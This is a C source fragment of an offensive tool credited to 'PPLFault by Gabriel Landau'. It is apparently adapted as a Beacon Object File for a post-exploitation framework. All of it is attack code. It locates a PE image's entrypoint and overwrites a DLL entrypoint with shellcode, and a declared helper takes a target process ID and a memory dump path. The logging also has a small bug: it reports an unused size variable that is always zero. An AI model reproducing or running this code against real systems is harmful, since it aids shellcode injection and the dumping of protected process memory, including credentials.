// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include <stdint.h>
#include "PayloadUtils.h"
#include "bofdefs.h"
#include <DbgHelp.h>
#include "fnptr.h"

extern BOOL InitShellcodeParams(
    PVOID pParams,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath
);
#define GetFNPtr(hmod, fname, varname, type) type varname = (type)GetProcAddress(hmod,fname)
// Finds the address within buf of the image entrypoint 
PVOID FindEntrypointVA( void * buf)
{
    PVOID pBase = buf;
    GetFNPtr(hdbghelp, "ImageNtHeader", _ImageNtHeader, fpImageNtHeader);
    GetFNPtr(hdbghelp, "ImageRvaToVa", _ImageRvaToVa, fpImageRvaToVa);
    PIMAGE_NT_HEADERS pNtHeaders = _ImageNtHeader(pBase);

    if (NULL == pNtHeaders)
    {
        BeaconPrintf(CALLBACK_ERROR, "FindOffsetOfEntrypoint: ImageNtHeader failed with GLE %u.  Is this a PE file?", KERNEL32$GetLastError());
        return NULL;
    }

    if (IMAGE_FILE_MACHINE_AMD64 != pNtHeaders->FileHeader.Machine)
    {
        BeaconPrintf(CALLBACK_ERROR, "FindOffsetOfEntrypoint: Only x64 is supported");
        return NULL;
    }

    // Map RVA -> VA
    return _ImageRvaToVa(pNtHeaders, pBase, pNtHeaders->OptionalHeader.AddressOfEntryPoint, NULL);
}

// Pulls the shellcode out of our resource section and writes to the given pointer
BOOL WriteShellcode(PVOID pBuf, PVOID shellcode, DWORD shellcodelen, DWORD* bytesWritten)
{
    HRSRC hr = NULL;
    HGLOBAL hg = NULL;
    LPVOID pResource = NULL;
    DWORD rSize = 0;

    

    memcpy(pBuf, shellcode, shellcodelen);
    *bytesWritten = shellcodelen;

    internal_printf("GetShellcode: %u bytes of shellcode written over DLL entrypoint", rSize);


    return TRUE;
}
